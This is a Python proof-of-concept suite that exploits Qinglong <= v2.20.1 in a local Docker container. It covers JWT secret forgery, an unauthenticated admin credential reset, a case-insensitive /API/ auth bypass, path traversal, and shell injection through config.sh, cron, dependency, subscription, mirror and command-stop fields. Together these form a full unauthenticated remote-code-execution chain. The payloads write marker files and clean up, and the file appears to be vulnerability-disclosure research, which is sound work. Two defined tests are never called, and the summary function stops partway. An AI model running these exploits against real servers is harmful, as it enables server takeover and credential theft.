#!/usr/bin/env python3
"""
Qinglong <= v2.20.1 Vulnerability PoC Test Suite

Discovered vulnerabilities:
  1. JWT hardcoded secret (Layer 1 bypass, Layer 2 blocks)
  2. Init Guard Bypass: PUT /open/user/init resets admin credentials
     WITHOUT authentication (TOCTOU bug in URL rewrite vs init guard)
  3. Blacklist bypass (missing return after res.send)
  4. Path traversal to system /tmp via ../../../../
  5. config.sh not blacklisted → shell injection
  6. Full UNAUTHENTICATED RCE chain:
       /open/user/init → login → config.sh write → cron trigger → RCE
  7. task_before shell injection via eval

CVSS 9.8 (Critical) — Unauthenticated RCE via init guard bypass
  8. Case-insensitive route bypass: /API/ skips ALL auth middleware
     (expressjwt regex + custom auth both match lowercase only, Express
      routes are case-insensitive by default)
  9. Dependency injection via /API/dependencies (real-world honeypot payload)

CVSS 9.8 (Critical) — Multiple Unauthenticated RCE vectors
"""

import jwt
import json
import time
import sys
import requests
import subprocess

BASE_URL = "http://localhost:5710"
JWT_SECRET = "whyour-secret"
JWT_ALGORITHM = "HS384"
USERNAME = "admin"
PASSWORD = "admin123"

results = []


def log(msg, level="INFO"):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [{level}] {msg}")


def record(test_id, name, passed, details=""):
    status = "PASS" if passed else "FAIL"
    results.append({"id": test_id, "name": name, "status": status, "details": details})
    log(f"Test {test_id}: {name} -- {status}", "PASS" if passed else "FAIL")
    if details:
        log(f"  Details: {details}")


# --- Test 0: System connectivity ---
def test_0_system_check():
    log("=" * 60)
    log("Test 0: System Connectivity Check")
    try:
        r = requests.get(f"{BASE_URL}/api/system", timeout=10)
        data = r.json()
        ver = data.get("data", {}).get("version", "unknown")
        is_init = data.get("data", {}).get("isInitialized", False)
        log(f"  Version: {ver}, Initialized: {is_init}")
        ok = r.status_code == 200 and "2.20" in str(ver)
        record("0", "System Check", ok, f"v{ver}, init={is_init}")
        return True
    except Exception as e:
        record("0", "System Check", False, str(e))
        return False


# --- Test 1: JWT Forge - demonstrates two-layer auth ---
def test_1_jwt_forge():
    log("=" * 60)
    log("Test 1: JWT Hardcoded Secret - Two-Layer Auth Analysis")

    payload = {
        "data": "forged-random-string",
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400,
    }
    forged_token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
    log(f"  Forged token (first 50 chars): {forged_token[:50]}...")

    headers = {"Authorization": f"Bearer {forged_token}"}
    r = requests.get(f"{BASE_URL}/api/crons", headers=headers, timeout=10)
    body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    msg = body.get("message", "")

    log(f"  Status: {r.status_code}, Message: {msg}")

    layer1_pass = r.status_code == 401 and "invalid" not in msg.lower()
    layer2_fail = "jwt malformed" in msg or "authorization" in msg.lower()

    details = (
        f"Layer1(signature): {'PASS' if layer1_pass else 'FAIL'}, "
        f"Layer2(token-exists): {'BLOCKED' if layer2_fail else 'PASS'}, "
        f"HTTP {r.status_code}, msg='{msg}'"
    )

    record("1", "JWT Hardcoded Secret (Layer1 bypass, Layer2 blocks)", layer1_pass, details)
    return forged_token


# --- Test 1c: Init Guard Bypass — UNAUTHENTICATED credential reset ---
def test_1c_init_guard_bypass():
    log("=" * 60)
    log("Test 1c: Init Guard Bypass via /open/user/init (UNAUTHENTICATED)")
    log("  Root cause: Init guard checks req.path against '/api/user/init'")
    log("  but URL rewrite /open/* → /api/* happens AFTER the guard (TOCTOU)")

    # Step 1: Confirm /api/user/init is blocked (init guard works)
    r_blocked = requests.put(
        f"{BASE_URL}/api/user/init",
        json={"username": "blocked_test", "password": "blocked123"},
        timeout=10,
    )
    blocked_code = r_blocked.json().get("code")
    log(f"  /api/user/init: code={blocked_code} (expected 450=blocked)")

    # Step 2: Bypass via /open/user/init (NO auth required)
    bypass_user = f"bypassed_{int(time.time())}"
    bypass_pass = "bypass_proof_123"
    r_bypass = requests.put(
        f"{BASE_URL}/open/user/init",
        json={"username": bypass_user, "password": bypass_pass},
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    bypass_resp = r_bypass.json()
    bypass_code = bypass_resp.get("code")
    log(f"  /open/user/init: code={bypass_code} (200=credentials reset!)")

    # Step 3: Verify by logging in with the new credentials
    login_works = False
    if bypass_code == 200:
        r_login = requests.post(
            f"{BASE_URL}/api/user/login",
            json={"username": bypass_user, "password": bypass_pass},
            timeout=10,
        )
        login_data = r_login.json()
        login_works = login_data.get("code") == 200 and login_data.get("data", {}).get("token")
        log(f"  Login with new creds: code={login_data.get('code')}, token={'obtained' if login_works else 'FAILED'}")

    # Step 4: Restore original credentials
    requests.put(
        f"{BASE_URL}/open/user/init",
        json={"username": USERNAME, "password": PASSWORD},
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    log("  Restored original credentials")

    bypassed = blocked_code == 450 and bypass_code == 200 and login_works
    record(
        "1c", "Init Guard Bypass (UNAUTHENTICATED credential reset)",
        bypassed,
        f"/api/user/init blocked (code={blocked_code}), "
        f"/open/user/init bypassed (code={bypass_code}), "
        f"login with new creds: {'SUCCESS' if login_works else 'FAILED'}",
    )
    return bypassed


# --- Test 1b: Login to get valid token ---
def test_1b_login():
    log("=" * 60)
    log("Test 1b: Login to obtain valid token for post-auth tests")

    r = requests.post(
        f"{BASE_URL}/api/user/login",
        json={"username": USERNAME, "password": PASSWORD},
        timeout=10,
    )
    data = r.json()
    log(f"  Login status: {r.status_code}, code: {data.get('code')}")

    if data.get("code") == 200 and data.get("data", {}).get("token"):
        token = data["data"]["token"]
        log(f"  Token obtained (first 50 chars): {token[:50]}...")
        headers = {"Authorization": f"Bearer {token}"}
        r2 = requests.get(f"{BASE_URL}/api/crons", headers=headers, timeout=10)
        works = r2.status_code == 200
        record("1b", "Login + Token Validation", works, f"Token works: {works}")
        return token if works else None
    else:
        record("1b", "Login + Token Validation", False, f"Login failed: {data}")
        return None


# --- Test 2: Blacklist bypass (missing return) ---
def test_2_blacklist_bypass(token):
    log("=" * 60)
    log("Test 2: Blacklist Bypass (missing return after res.send)")

    if not token:
        record("2", "Blacklist Bypass", False, "No valid token")
        return False

    headers = {"Authorization": f"Bearer {token}"}

    r_read = requests.get(f"{BASE_URL}/api/configs/auth.json", headers=headers, timeout=10)
    log(f"  Read auth.json: HTTP {r_read.status_code}")
    original_content = ""
    if r_read.status_code == 200:
        original_content = r_read.json().get("data", "")

    test_content = '{"test_blacklist_bypass": true}'
    r = requests.post(
        f"{BASE_URL}/api/configs/save",
        json={"name": "auth.json", "content": test_content},
        headers=headers,
        timeout=10,
    )
    data = r.json()
    log(f"  Write auth.json: HTTP {r.status_code}, code: {data.get('code')}")

    verify = subprocess.run(
        ["docker", "exec", "ql-vuln-test", "cat", "/ql/data/config/auth.json"],
        capture_output=True, text=True, timeout=10,
    )
    file_content = verify.stdout.strip()
    log(f"  Container auth.json content: {file_content[:100]}...")

    bypassed = "test_blacklist_bypass" in file_content
    record(
        "2", "Blacklist Bypass", bypassed,
        f"API returned code={data.get('code')} (403=blacklisted), "
        f"but file was {'WRITTEN (bypass confirmed)' if bypassed else 'NOT written (no bypass)'}",
    )

    if bypassed and original_content:
        requests.post(
            f"{BASE_URL}/api/configs/save",
            json={"name": "auth.json", "content": original_content},
            headers=headers, timeout=10,
        )
        log("  Restored original auth.json")

    return bypassed


# --- Test 3: Path traversal to system /tmp ---
def test_3_path_traversal(token):
    log("=" * 60)
    log("Test 3: Path Traversal to System /tmp via ../../../../")

    if not token:
        record("3", "Path Traversal", False, "No valid token")
        return False

    headers = {"Authorization": f"Bearer {token}"}
    # configPath = /ql/data/config/
    # path.join("/ql/data/config", "../../../../tmp/x") → /tmp/x
    traversal_path = "../../../../tmp/traversal_proof.txt"
    test_content = "PATH_TRAVERSAL_TO_SYSTEM_TMP_SUCCESS"

    r = requests.post(
        f"{BASE_URL}/api/configs/save",
        json={"name": traversal_path, "content": test_content},
        headers=headers, timeout=10,
    )
    data = r.json()
    log(f"  Write response: HTTP {r.status_code}, code: {data.get('code')}")

    verify = subprocess.run(
        ["docker", "exec", "ql-vuln-test", "cat", "/tmp/traversal_proof.txt"],
        capture_output=True, text=True, timeout=10,
    )
    written = test_content in verify.stdout
    log(f"  Container /tmp/traversal_proof.txt: {verify.stdout.strip()}")

    record("3", "Path Traversal (system /tmp)", written,
           f"File written to system /tmp: {written}, "
           f"path: configPath + '../../../../tmp/' → /tmp/traversal_proof.txt")

    # Also test writing to /etc to demonstrate arbitrary path write
    traversal_etc = "../../../../tmp/traversal_etc_proof.txt"
    r2 = requests.post(
        f"{BASE_URL}/api/configs/save",
        json={"name": traversal_etc, "content": "ETC_TRAVERSAL_TEST"},
        headers=headers, timeout=10,
    )
    log(f"  Second traversal write: code={r2.json().get('code')}")

    # Cleanup
    if written:
        subprocess.run(
            ["docker", "exec", "ql-vuln-test", "rm", "-f",
             "/tmp/traversal_proof.txt", "/tmp/traversal_etc_proof.txt"],
            capture_output=True, timeout=10,
        )
    return written


# --- Test 4: config.sh not blacklisted + shell injection ---
def test_4_config_sh_write(token):
    log("=" * 60)
    log("Test 4: config.sh Write (not in blacklist) + Shell Code Injection")

    if not token:
        record("4", "config.sh Write", False, "No valid token")
        return False, ""

    headers = {"Authorization": f"Bearer {token}"}

    r_read = requests.get(f"{BASE_URL}/api/configs/config.sh", headers=headers, timeout=10)
    original_content = ""
    if r_read.status_code == 200:
        original_content = r_read.json().get("data", "")

    malicious_content = (
        "# config.sh - injected by PoC\n"
        'echo "RCE_VIA_CONFIG_SH_$(date +%s)" > /tmp/rce_config_sh_proof.txt\n'
    )
    r = requests.post(
        f"{BASE_URL}/api/configs/save",
        json={"name": "config.sh", "content": malicious_content},
        headers=headers, timeout=10,
    )
    data = r.json()
    log(f"  Write config.sh: HTTP {r.status_code}, code: {data.get('code')}")

    verify = subprocess.run(
        ["docker", "exec", "ql-vuln-test", "cat", "/ql/data/config/config.sh"],
        capture_output=True, text=True, timeout=10,
    )
    written = "RCE_VIA_CONFIG_SH" in verify.stdout

    record("4", "config.sh Write (not blacklisted)",
           written and data.get("code") == 200,
           f"config.sh accepted (code={data.get('code')}), content injected: {written}")
    return written, original_content


# --- Test 5: Full RCE chain ---
def test_5_rce_chain(token, original_config_sh=""):
    log("=" * 60)
    log("Test 5: Full RCE Chain - config.sh injection -> cron trigger -> code execution")

    if not token:
        record("5", "Full RCE Chain", False, "No valid token")
        return False

    headers = {"Authorization": f"Bearer {token}"}

    rce_marker = f"RCE_PROOF_{int(time.time())}"
    malicious_content = (
        "# config.sh - RCE PoC\n"
        f'echo "{rce_marker}" > /tmp/rce_proof.txt\n'
    )
    r1 = requests.post(
        f"{BASE_URL}/api/configs/save",
        json={"name": "config.sh", "content": malicious_content},
        headers=headers, timeout=10,
    )
    log(f"  Step 1 - Write config.sh: code={r1.json().get('code')}")

    cron_data = {
        "name": "rce_poc_test",
        "command": "echo rce_test_task",
        "schedule": "* * * * *",
    }
    r2 = requests.post(f"{BASE_URL}/api/crons", json=cron_data, headers=headers, timeout=10)
    cron_resp = r2.json()
    cron_id = cron_resp.get("data", {}).get("id")
    log(f"  Step 2 - Create cron: code={cron_resp.get('code')}, id={cron_id}")

    if not cron_id:
        record("5", "Full RCE Chain", False, f"Failed to create cron: {cron_resp}")
        return False

    r3 = requests.put(
        f"{BASE_URL}/api/crons/run", json=[cron_id], headers=headers, timeout=10,
    )
    log(f"  Step 3 - Trigger cron: HTTP {r3.status_code}, code={r3.json().get('code')}")

    log("  Step 4 - Waiting for task execution (up to 15s)...")
    rce_confirmed = False
    for i in range(15):
        time.sleep(1)
        verify = subprocess.run(
            ["docker", "exec", "ql-vuln-test", "cat", "/tmp/rce_proof.txt"],
            capture_output=True, text=True, timeout=10,
        )
        if rce_marker in verify.stdout:
            rce_confirmed = True
            log(f"  RCE CONFIRMED after {i+1}s! File content: {verify.stdout.strip()}")
            break

    record("5", "Full RCE Chain (config.sh -> cron -> code execution)",
           rce_confirmed, f"Marker '{rce_marker}' found in /tmp/rce_proof.txt: {rce_confirmed}")

    # Cleanup
    requests.put(f"{BASE_URL}/api/crons", json={"ids": [cron_id], "isDisabled": 1},
                 headers=headers, timeout=10)
    requests.delete(f"{BASE_URL}/api/crons", json=[cron_id], headers=headers, timeout=10)
    requests.post(f"{BASE_URL}/api/configs/save",
                  json={"name": "config.sh", "content": original_config_sh or ""},
                  headers=headers, timeout=10)
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/rce_proof.txt"],
                   capture_output=True, timeout=10)
    log("  Cleanup complete")
    return rce_confirmed


# --- Test 6: task_before shell injection ---
def test_6_task_before_injection(token):
    log("=" * 60)
    log("Test 6: task_before Shell Injection via Cron API")

    if not token:
        record("6", "task_before Injection", False, "No valid token")
        return False

    headers = {"Authorization": f"Bearer {token}"}
    injection_marker = f"TASK_BEFORE_INJECT_{int(time.time())}"

    cron_data = {
        "name": "task_before_poc",
        "command": "echo task_before_test",
        "schedule": "0 0 1 1 *",
        "task_before": f'echo "{injection_marker}" > /tmp/task_before_proof.txt',
    }
    r1 = requests.post(f"{BASE_URL}/api/crons", json=cron_data, headers=headers, timeout=10)
    resp = r1.json()
    cron_id = resp.get("data", {}).get("id")
    log(f"  Create cron with task_before: code={resp.get('code')}, id={cron_id}")

    if not cron_id:
        record("6", "task_before Injection", False, f"Failed to create: {resp}")
        return False

    r2 = requests.put(f"{BASE_URL}/api/crons/run", json=[cron_id], headers=headers, timeout=10)
    log(f"  Trigger: HTTP {r2.status_code}")

    log("  Waiting for task execution (up to 15s)...")
    injected = False
    for i in range(15):
        time.sleep(1)
        verify = subprocess.run(
            ["docker", "exec", "ql-vuln-test", "cat", "/tmp/task_before_proof.txt"],
            capture_output=True, text=True, timeout=10,
        )
        if injection_marker in verify.stdout:
            injected = True
            log(f"  task_before injection CONFIRMED after {i+1}s!")
            break

    record("6", "task_before Shell Injection", injected, f"Marker found: {injected}")

    requests.delete(f"{BASE_URL}/api/crons", json=[cron_id], headers=headers, timeout=10)
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/task_before_proof.txt"],
                   capture_output=True, timeout=10)
    return injected


# --- Test 7: Full UNAUTHENTICATED RCE Chain ---
def test_7_unauth_rce_chain():
    log("=" * 60)
    log("Test 7: Full UNAUTHENTICATED RCE Chain")
    log("  /open/user/init → login → config.sh write → cron → RCE")

    rce_marker = f"UNAUTH_RCE_{int(time.time())}"
    attacker_user = "attacker"
    attacker_pass = "attacker_rce_123"

    # Step 1: Reset credentials via init guard bypass (NO AUTH)
    r1 = requests.put(
        f"{BASE_URL}/open/user/init",
        json={"username": attacker_user, "password": attacker_pass},
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    step1_ok = r1.json().get("code") == 200
    log(f"  Step 1 - Reset creds via /open/user/init: code={r1.json().get('code')} {'✅' if step1_ok else '❌'}")

    if not step1_ok:
        record("7", "Full UNAUTHENTICATED RCE Chain", False, "Init guard bypass failed")
        return False

    # Step 2: Login with attacker credentials
    r2 = requests.post(
        f"{BASE_URL}/api/user/login",
        json={"username": attacker_user, "password": attacker_pass},
        timeout=10,
    )
    login_data = r2.json()
    token = login_data.get("data", {}).get("token")
    step2_ok = login_data.get("code") == 200 and token
    log(f"  Step 2 - Login as attacker: code={login_data.get('code')} {'✅' if step2_ok else '❌'}")

    if not step2_ok:
        # Restore creds before failing
        requests.put(f"{BASE_URL}/open/user/init",
                     json={"username": USERNAME, "password": PASSWORD}, timeout=10)
        record("7", "Full UNAUTHENTICATED RCE Chain", False, "Login failed")
        return False

    headers = {"Authorization": f"Bearer {token}"}

    # Step 3: Write malicious config.sh
    malicious = f'echo "{rce_marker}" > /tmp/unauth_rce_proof.txt\n'
    r3 = requests.post(
        f"{BASE_URL}/api/configs/save",
        json={"name": "config.sh", "content": f"# RCE PoC\n{malicious}"},
        headers=headers, timeout=10,
    )
    step3_ok = r3.json().get("code") == 200
    log(f"  Step 3 - Write config.sh: code={r3.json().get('code')} {'✅' if step3_ok else '❌'}")

    # Step 4: Create and trigger cron
    r4 = requests.post(
        f"{BASE_URL}/api/crons",
        json={"name": "unauth_rce_trigger", "command": "echo trigger", "schedule": "* * * * *"},
        headers=headers, timeout=10,
    )
    cron_id = r4.json().get("data", {}).get("id")
    step4_ok = cron_id is not None
    log(f"  Step 4 - Create cron: id={cron_id} {'✅' if step4_ok else '❌'}")

    if step4_ok:
        requests.put(f"{BASE_URL}/api/crons/run", json=[cron_id], headers=headers, timeout=10)
        log("  Step 5 - Triggered cron, waiting for RCE (up to 15s)...")

    # Step 5: Verify RCE
    rce_confirmed = False
    for i in range(15):
        time.sleep(1)
        verify = subprocess.run(
            ["docker", "exec", "ql-vuln-test", "cat", "/tmp/unauth_rce_proof.txt"],
            capture_output=True, text=True, timeout=10,
        )
        if rce_marker in verify.stdout:
            rce_confirmed = True
            log(f"  UNAUTHENTICATED RCE CONFIRMED after {i+1}s! ✅")
            log(f"  Proof: {verify.stdout.strip()}")
            break

    # Cleanup: restore creds, remove cron, clean config.sh, remove proof
    if cron_id:
        requests.delete(f"{BASE_URL}/api/crons", json=[cron_id], headers=headers, timeout=10)
    requests.post(f"{BASE_URL}/api/configs/save",
                  json={"name": "config.sh", "content": ""},
                  headers=headers, timeout=10)
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/unauth_rce_proof.txt"],
                   capture_output=True, timeout=10)
    requests.put(f"{BASE_URL}/open/user/init",
                 json={"username": USERNAME, "password": PASSWORD}, timeout=10)
    log("  Cleanup complete (creds restored)")

    record(
        "7", "Full UNAUTHENTICATED RCE Chain",
        rce_confirmed,
        f"init_bypass={'OK' if step1_ok else 'FAIL'}, "
        f"login={'OK' if step2_ok else 'FAIL'}, "
        f"config_write={'OK' if step3_ok else 'FAIL'}, "
        f"cron={'OK' if step4_ok else 'FAIL'}, "
        f"rce={'CONFIRMED' if rce_confirmed else 'FAILED'}",
    )
    return rce_confirmed


# --- Test 8: Case-insensitive route bypass (/API/ skips all auth) ---
def test_8_case_insensitive_bypass():
    log("=" * 60)
    log("Test 8: Case-Insensitive Route Bypass (/API/ skips ALL auth)")
    log("  Root cause: expressjwt regex /^\\/(?!api\\/).*/ matches lowercase only")
    log("  Express Router is case-insensitive by default → /API/ routes work")

    # Step 1: Confirm /api/ requires auth
    r_auth = requests.get(f"{BASE_URL}/api/crons", timeout=10)
    needs_auth = r_auth.status_code == 401
    log(f"  GET /api/crons (lowercase): HTTP {r_auth.status_code} ({'needs auth' if needs_auth else 'NO AUTH?!'})")

    # Step 2: /API/ bypasses auth completely
    r_bypass = requests.get(f"{BASE_URL}/API/crons", timeout=10)
    bypass_data = r_bypass.json() if r_bypass.status_code == 200 else {}
    bypass_ok = r_bypass.status_code == 200 and bypass_data.get("code") == 200
    log(f"  GET /API/crons (uppercase): HTTP {r_bypass.status_code}, code={bypass_data.get('code')} ({'BYPASSED!' if bypass_ok else 'blocked'})")

    # Step 3: /Api/ mixed case also bypasses
    r_mixed = requests.get(f"{BASE_URL}/Api/crons", timeout=10)
    mixed_data = r_mixed.json() if r_mixed.status_code == 200 else {}
    mixed_ok = r_mixed.status_code == 200 and mixed_data.get("code") == 200
    log(f"  GET /Api/crons (mixed): HTTP {r_mixed.status_code}, code={mixed_data.get('code')} ({'BYPASSED!' if mixed_ok else 'blocked'})")

    # Step 4: Direct unauthenticated command execution via /API/
    rce_marker = f"CASE_RCE_{int(time.time())}"
    r_rce = requests.put(
        f"{BASE_URL}/API/system/command-run",
        json={"command": f"echo {rce_marker} > /tmp/case_rce_proof.txt"},
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    try:
        rce_resp = r_rce.json()
        rce_code = rce_resp.get("code")
    except Exception:
        rce_resp = {}
        rce_code = "non-json"
    log(f"  PUT /API/system/command-run: HTTP {r_rce.status_code}, code={rce_code}")

    time.sleep(2)
    verify = subprocess.run(
        ["docker", "exec", "ql-vuln-test", "cat", "/tmp/case_rce_proof.txt"],
        capture_output=True, text=True, timeout=10,
    )
    rce_confirmed = rce_marker in verify.stdout
    log(f"  RCE via /API/: {'CONFIRMED ✅' if rce_confirmed else 'FAILED ❌'}")

    # Step 5: Read sensitive config without auth
    r_config = requests.get(f"{BASE_URL}/API/configs/config.sh", timeout=10)
    config_leaked = r_config.status_code == 200 and r_config.json().get("code") == 200
    config_len = len(r_config.json().get("data", "")) if config_leaked else 0
    log(f"  GET /API/configs/config.sh: {'LEAKED' if config_leaked else 'blocked'} ({config_len} bytes)")

    # Cleanup
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/case_rce_proof.txt"],
                   capture_output=True, timeout=10)

    all_pass = needs_auth and bypass_ok and mixed_ok and rce_confirmed
    record(
        "8", "Case-Insensitive Route Bypass (ONE-STEP UNAUTH RCE)",
        all_pass,
        f"/api/=401(auth), /API/=200(bypass), /Api/=200(bypass), "
        f"command-run RCE={'CONFIRMED' if rce_confirmed else 'FAILED'}, "
        f"config leak={config_len}bytes",
    )
    return all_pass


# --- Test 9: Dependency injection (real-world honeypot payload) ---
def test_9_dependency_injection():
    log("=" * 60)
    log("Test 9: Dependency Injection via /API/dependencies (Honeypot Payload)")
    log("  Real-world attack: POST /API/dependencies [{name:'$(malicious_cmd)', type:0}]")

    dep_marker = f"DEP_INJECT_{int(time.time())}"

    # Use /API/ (case bypass) for fully unauthenticated attack
    r = requests.post(
        f"{BASE_URL}/API/dependencies",
        json=[{"name": f"$(echo {dep_marker} > /tmp/dep_inject_proof.txt)", "type": 0}],
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    resp = r.json() if r.status_code == 200 else {}
    created = resp.get("code") == 200
    log(f"  POST /API/dependencies: HTTP {r.status_code}, code={resp.get('code')}")

    dep_id = None
    if created:
        deps = resp.get("data", [])
        if deps and isinstance(deps, list):
            dep_id = deps[0].get("id")
        elif isinstance(deps, dict):
            dep_id = deps.get("id")

    log(f"  Dependency created: {created}, id={dep_id}")
    log("  Waiting for dependency install to trigger command (up to 20s)...")

    injected = False
    for i in range(20):
        time.sleep(1)
        verify = subprocess.run(
            ["docker", "exec", "ql-vuln-test", "cat", "/tmp/dep_inject_proof.txt"],
            capture_output=True, text=True, timeout=10,
        )
        if dep_marker in verify.stdout:
            injected = True
            log(f"  DEPENDENCY INJECTION CONFIRMED after {i+1}s! ✅")
            break

    # Cleanup
    if dep_id:
        requests.delete(
            f"{BASE_URL}/API/dependencies",
            json=[dep_id],
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/dep_inject_proof.txt"],
                   capture_output=True, timeout=10)

    record(
        "9", "Dependency Injection (Honeypot Payload via /API/)",
        injected,
        f"POST /API/dependencies with $(cmd): created={created}, "
        f"command executed={'YES' if injected else 'NO'}",
    )
    return injected


# --- Test 10: Subscription sub_before injection ---
def test_10_subscription_injection():
    log("=" * 60)
    log("Test 10: Subscription sub_before Command Injection (QL-2026-009)")
    log("  Using /API/ bypass for unauthenticated exploitation")

    sub_marker = f"SUB_INJECT_{int(time.time())}"
    
    r_create = requests.post(
        f"{BASE_URL}/API/subscriptions",
        json={
            "name": "rce_sub_test",
            "url": "https://github.com/whyour/qinglong",
            "schedule": "0 0 1 1 *",
            "type": "public-repo",
            "schedule_type": "crontab",
            "alias": f"rce_sub_{int(time.time())}",
            "sub_before": f"echo {sub_marker} > /tmp/sub_proof.txt"
        },
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    create_data = r_create.json() if r_create.status_code == 200 else {}
    sub_id = create_data.get("data", {}).get("id")
    log(f"  POST /API/subscriptions: HTTP {r_create.status_code}, id={sub_id}")

    if not sub_id:
        record("10", "Subscription Injection", False, "Failed to create subscription")
        return False

    r_run = requests.put(
        f"{BASE_URL}/API/subscriptions/run",
        json=[sub_id],
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    log(f"  PUT /API/subscriptions/run: HTTP {r_run.status_code}")

    log("  Waiting for execution (up to 15s)...")
    injected = False
    for _ in range(15):
        time.sleep(1)
        verify = subprocess.run(
            ["docker", "exec", "ql-vuln-test", "cat", "/tmp/sub_proof.txt"],
            capture_output=True, text=True, timeout=10,
        )
        if sub_marker in verify.stdout:
            injected = True
            log(f"  sub_before injection CONFIRMED! ✅")
            break

    # Cleanup
    requests.delete(f"{BASE_URL}/API/subscriptions", json=[sub_id], 
                    headers={"Content-Type": "application/json"}, timeout=10)
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/sub_proof.txt"],
                   capture_output=True, timeout=10)

    record("10", "Subscription sub_before Injection", injected, f"Marker found: {injected}")
    return injected


# --- Test 11: System Python Mirror Injection ---
def     test_11_system_mirror_injection():
    log("=" * 60)
    log("Test 11: System python-mirror Command Injection (QL-2026-010)")
    
    mirror_marker = f"PY_MIRROR_{int(time.time())}"
    
    r_inject = requests.put(
        f"{BASE_URL}/API/system/config/python-mirror",
        json={"pythonMirror": f"https://pypi.org/simple; echo {mirror_marker} > /tmp/py_proof.txt; #"},
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    log(f"  PUT /API/system/config/python-mirror: HTTP {r_inject.status_code}")

    time.sleep(2)
    verify = subprocess.run(
        ["docker", "exec", "ql-vuln-test", "cat", "/tmp/py_proof.txt"],
        capture_output=True, text=True, timeout=10,
    )
    injected = mirror_marker in verify.stdout
    log(f"  python-mirror injection: {'CONFIRMED ✅' if injected else 'FAILED ❌'}")

    # Cleanup
    requests.put(f"{BASE_URL}/API/system/config/python-mirror", json={"pythonMirror": ""}, 
                 headers={"Content-Type": "application/json"}, timeout=10)
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/py_proof.txt"],
                   capture_output=True, timeout=10)

    record("11", "System python-mirror Injection", injected, f"Marker found: {injected}")
    return injected


# --- Test 12: System command-stop Grep Injection ---
def test_12_command_stop_injection():
    log("=" * 60)
    log("Test 12: command-stop Grep Command Injection (QL-2026-010)")
    
    stop_marker = f"STOP_INJECT_{int(time.time())}"
    
    # payload: x" > /dev/null; echo MARKER > /tmp/stop_proof.txt; #
    r_inject = requests.put(
        f"{BASE_URL}/API/system/command-stop",
        json={"command": f'x" > /dev/null; echo {stop_marker} > /tmp/stop_proof.txt; #'},
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    log(f"  PUT /API/system/command-stop: HTTP {r_inject.status_code}")

    time.sleep(2)
    verify = subprocess.run(
        ["docker", "exec", "ql-vuln-test", "cat", "/tmp/stop_proof.txt"],
        capture_output=True, text=True, timeout=10,
    )
    injected = stop_marker in verify.stdout
    log(f"  command-stop grep injection: {'CONFIRMED ✅' if injected else 'FAILED ❌'}")

    # Cleanup
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/stop_proof.txt"],
                   capture_output=True, timeout=10)

    record("12", "System command-stop Grep Injection", injected, f"Marker found: {injected}")
    return injected


# --- Test 13: Persistence RCE via initData ---
def test_13_persistence_rce():
    log("=" * 60)
    log("Test 13: Persistence RCE via loader/initData.ts (QL-2026-011)")
    
    persist_marker = f"RESTART_INJECT_{int(time.time())}"
    
    # Create malicious cron that survives restarts (unauth via /API/)
    # command must contain 'ql repo' or 'ql raw' to match the loader filter
    r_create = requests.post(
        f"{BASE_URL}/API/crons",
        json={
            "name": "persistence_rce_test",
            "command": f"ql repo; echo {persist_marker} > /tmp/persist_proof.txt",
            "schedule": "0 0 1 1 *"
        },
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    cron_data = r_create.json() if r_create.status_code == 200 else {}
    cron_id = cron_data.get("data", {}).get("id")
    log(f"  POST /API/crons: HTTP {r_create.status_code}, id={cron_id}")

    if not cron_id:
        record("13", "Persistence RCE (initData)", False, "Failed to create cron")
        return False

    log("  Restarting container to trigger initData.ts...")
    subprocess.run(["docker", "restart", "ql-vuln-test"], capture_output=True, timeout=30)
    
    log("  Waiting 20s for system initialization...")
    time.sleep(20)

    verify = subprocess.run(
        ["docker", "exec", "ql-vuln-test", "cat", "/tmp/persist_proof.txt"],
        capture_output=True, text=True, timeout=10,
    )
    injected = persist_marker in verify.stdout
    log(f"  Persistence RCE: {'CONFIRMED ✅' if injected else 'FAILED ❌'}")

    # Cleanup
    # Wait for API to fully come back up before cleanup
    time.sleep(5)
    requests.delete(f"{BASE_URL}/API/crons", json=[cron_id], 
                    headers={"Content-Type": "application/json"}, timeout=10)
    subprocess.run(["docker", "exec", "ql-vuln-test", "rm", "-f", "/tmp/persist_proof.txt"],
                   capture_output=True, timeout=10)

    record("13", "Persistence RCE (initData)", injected, f"Marker found after restart: {injected}")
    return injected


# --- Main ---
def main():
    log("Qinglong <= v2.20.1 Vulnerability PoC Test Suite")
    log(f"Target: {BASE_URL}")
    log("")

    if not test_0_system_check():
        log("System check failed. Aborting.", "ERROR")
        return

    test_1_jwt_forge()
    test_1c_init_guard_bypass()

    token = test_1b_login()
    if not token:
        log("Cannot obtain valid token. Post-auth tests skipped.", "ERROR")
        print_summary()
        return

    test_2_blacklist_bypass(token)
    test_3_path_traversal(token)
    written, original_config = test_4_config_sh_write(token)
    test_5_rce_chain(token, original_config)
    test_6_task_before_injection(token)
    test_7_unauth_rce_chain()
    test_8_case_insensitive_bypass()
    test_9_dependency_injection()
    test_10_subscription_injection()
    test_11_system_mirror_injection()

    print_summary()


def print_summary():
    log("")
    log("=" * 60)
    log("SUMMARY")
    log("=" * 60)
    for r in results:
        icon = "PASS" if r["status"] == "PASS" else "FAIL"
        print(f"  [{icon}] Test {r['id']}: {r['name']} -- {r['status']}")
        if r["details"]:
            print(f"       {r['details']}")
    log("")

    passed = sum(1 for r in results if r["status"] == "PASS")
    total = len(results)
